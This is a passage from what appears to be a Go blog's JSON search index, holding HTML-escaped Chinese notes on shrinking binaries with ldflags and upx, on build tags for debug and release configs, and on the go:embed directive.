進行除錯了\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 若對符號表無需求，-ldflags 直接新增 \u0026#34;-s\u0026#34; 即可\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# 注：不建議-w和-s同時使用\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -ldflags \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;-s -w\u0026#34;\u003c/span\u003e -o test2 main.go\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ du -sh test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e11M    test2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"upxbrewyum-install-upx\"\u003eupx(\u003ccode\u003ebrew/yum install upx\u003c/code\u003e)\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ upx test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                         Ultimate Packer \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e eXecutables\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                            Copyright \u003cspan style=\"color:#f92672\"\u003e(\u003c/span\u003eC\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e1996\u003c/span\u003e - \u003cspan style=\"color:#ae81ff\"\u003e2020\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eUPX 3.96        Markus Oberhumer, Laszlo Molnar \u0026amp; John Reiser   Jan 23rd \u003cspan style=\"color:#ae81ff\"\u003e2020\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        File size         Ratio      Format      Name\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  --------------------   ------   -----------   -----------\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#ae81ff\"\u003e11490768\u003c/span\u003e -\u0026gt;   \u003cspan style=\"color:#ae81ff\"\u003e4063248\u003c/span\u003e   35.36%   macho/amd64   test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ePacked \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e file.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ upx --brute test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ du -sh test2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e4.6M    test2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eupx 的壓縮選項\u003c/p\u003e","tags":["URL","Go","Docker"],"title":"為你的Go應用建立輕量級Docker映象？ | IT人"},{"categories":["URL","Go"],"contents":" [Golang] 利用 build tags 達到不同的 build config Go build -ldflags package main import ( \u0026#34;fmt\u0026#34; ) var flagString string func main() { fmt.Println(\u0026#34;This build with ldflag:\u0026#34;, flagString) } $ go build -ldflags \u0026#39;-X main.flagString \u0026#34;test\u0026#34;\u0026#39; $ ./main This build with ldflag: test Go build -tags debug_config.go //+build debug package main var TestString string = \u0026#34;test debug\u0026#34; var TestString2 string = \u0026#34; and it will run every module with debug tag.\u0026#34; func GetConfigString() string { return \u0026#34;it is debug.....\u0026#34; } //+build debug 前後需要一個空行(除非你在第一行) release_config.go //+build !debug package main var TestString string = \u0026#34;test release\u0026#34; var TestString2 string = \u0026#34; and it will run every module as no debug tag.\u0026#34; func GetConfigString() string { return \u0026#34;it is release.....\u0026#34; } main package main import ( \u0026#34;fmt\u0026#34; ) func main() { fmt.Println(\u0026#34;This build is \u0026#34;, TestString, TestString2, GetConfigString()) } $ go build -tags debug . $ ./main This build is test debug and it will run every module with debug tag. it is debug..... $ go build . $ ./main This build is test release and it will run every module as no debug tag. it is release..... ","date":"July 18, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220718-go-build-config-ldflags/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.evanlin.com/go-build-config-ldflags/\" target=\"_blank\" rel=\"noopener\"\u003e[Golang] 利用 build tags 達到不同的 build config\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"go-build--ldflags\"\u003eGo build -ldflags\u003c/h5\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eflagString\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;This build with ldflag:\u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eflagString\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -ldflags \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;-X main.flagString \u0026#34;test\u0026#34;\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThis build with ldflag: test\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"go-build--tags\"\u003eGo build -tags\u003c/h5\u003e\n\u003ch6 id=\"debug_configgo\"\u003edebug_config.go\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//+build debug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test debug\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString2\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; and it will run every module with debug tag.\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eGetConfigString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;it is debug.....\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\n\n    \n\n\n\u003cdiv class=\"alert warning\"\u003e\n    \u003cspan\u003e\u003ci data-feather=\"alert-triangle\"\u003e\u003c/i\u003e\u003c/span\u003e\n    \u003cspan\u003e\u003cstrong\u003e\u003ccode\u003e//+build debug\u003c/code\u003e 前後需要一個空行(除非你在第一行)\u003c/strong\u003e\u003c/span\u003e\n\u003c/div\u003e\n\n\u003ch6 id=\"release_configgo\"\u003erelease_config.go\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//+build !debug\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;test release\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eTestString2\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e = \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; and it will run every module as no debug tag.\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eGetConfigString\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;it is release.....\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"main\"\u003emain\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;This build is \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eTestString\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eTestString2\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eGetConfigString\u003c/span\u003e())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003chr\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build -tags debug .\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThis build is  test debug  and it will run every module with debug tag. it is debug.....\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go build .\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ ./main\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eThis build is  test release  and it will run every module as no debug tag. it is release.....\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"[Golang] 利用build tags達到不同的build config"},{"categories":["URL","Go"],"contents":" Go embed 简明教程 嵌入 对于单个的文件，支持嵌入为string和 []byre 对于多个文件和文件夹，支持嵌入为新的文件系统 FS 比如导入 \u0026ldquo;embed\u0026rdquo; 包，即使无显式的使用 go:embed 指令用来嵌入，必须紧跟着嵌入后的变量名 只支持嵌入为 string, []byte 和 embed.FS 三种类型，这三种类型的别名(alias)和命名类型(如 type S string)都不可以 使用的是相对路径 string/[]byte package main import ( _ \u0026#34;embed\u0026#34; \u0026#34;fmt\u0026#34; ) //go:embed hello.txt var s string //go:embed hello.txt var b []byte func main() { fmt.Println(s) fmt.Println(b) } embed.FS package main import ( \u0026#34;embed\u0026#34; \u0026#34;fmt\u0026#34; ) //go:embed hello.txt hello2.txt //go:embed \u0026#34;p/he llo.txt\u0026#34; //go:embed `p/hello-2.txt` //go:embed dir var f embed.FS func main() { data, _ := f.ReadFile(\u0026#34;hello.txt\u0026#34;) fmt.Println(string(data)) data, _ = f.ReadFile(\u0026#34;hello2.txt\u0026#34;) fmt.Println(string(data)) data, _ := f.ReadFile(\u0026#34;p/he llo.txt\u0026#34;) fmt.Println(string(data)) data, _ = f.ReadFile(\u0026#34;p/hello-2.txt\u0026#34;) fmt.Println(string(data)) } 匹配模式 go:embed 指令中可以只写文件夹名，此文件夹中除了.和_开头的文件和文件夹都会被嵌入，并且子文件夹也会被递归的嵌入，形成一个此文件夹的文件系统。\n如果想嵌入.和_开头的文件和文件夹， 比如 p 文件夹下的.hello.txt 文件，那么就需要使用*，比如 go:embed p/*。\n不具有递归性，所以子文件夹下的.和_不会被嵌入，除非你在专门使用子文件夹的进行嵌入\npackage main import ( \u0026#34;embed\u0026#34; \u0026#34;fmt\u0026#34; ) //go:embed p/* var f embed.FS //go:embed * var ff embed.FS func main() { data, _ := f.ReadFile(\u0026#34;p/.hello.txt\u0026#34;) fmt.Println(string(data)) data, _ = f.ReadFile(\u0026#34;p/q/.hi.txt\u0026#34;) // 没有嵌入 p/q/.hi.txt fmt.Println(string(data)) data, _ := ff.ReadFile(\u0026#34;hello.txt\u0026#34;) fmt.Println(string(data)) data, _ = ff.ReadFile(\u0026#34;.hello.txt\u0026#34;) fmt.Println(string(data)) } net/http http.Handle(\u0026quot;/\u0026quot;, http.FileServer(http.FS(ff)))\n","date":"July 12, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220712-go-embed-tutorial/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://colobu.com/2021/01/17/go-embed-tutorial/\" target=\"_blank\" rel=\"noopener\"\u003eGo embed 简明教程\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"嵌入\"\u003e嵌入\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e对于单个的文件，支持嵌入为\u003ccode\u003estring\u003c/code\u003e和 \u003ccode\u003e[]byre\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e对于多个文件和文件夹，支持嵌入为新的文件系统 FS\u003c/li\u003e\n\u003cli\u003e比如导入 \u0026ldquo;embed\u0026rdquo; 包，即使无显式的使用\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ego:embed\u003c/code\u003e 指令用来嵌入，必须紧跟着嵌入后的变量名\u003c/li\u003e\n\u003cli\u003e只支持嵌入为 \u003ccode\u003estring\u003c/code\u003e, \u003ccode\u003e[]byte\u003c/code\u003e 和 \u003ccode\u003eembed.FS\u003c/code\u003e 三种类型，这三种类型的别名(alias)和命名类型(如 type S string)都不可以\u003c/li\u003e\n\u003cli\u003e使用的是相对路径\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"stringbyte\"\u003estring/[]byte\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;embed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed hello.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed hello.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003es\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eb\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"embedfs\"\u003eembed.FS\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;embed\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed hello.txt hello2.txt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed \u0026#34;p/he llo.txt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed `p/hello-2.txt`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e//go:embed dir\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eembed\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eFS\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ef\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReadFile\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;hello.txt\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(string(\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003edata\u003c/span\u003e, \u003cspan 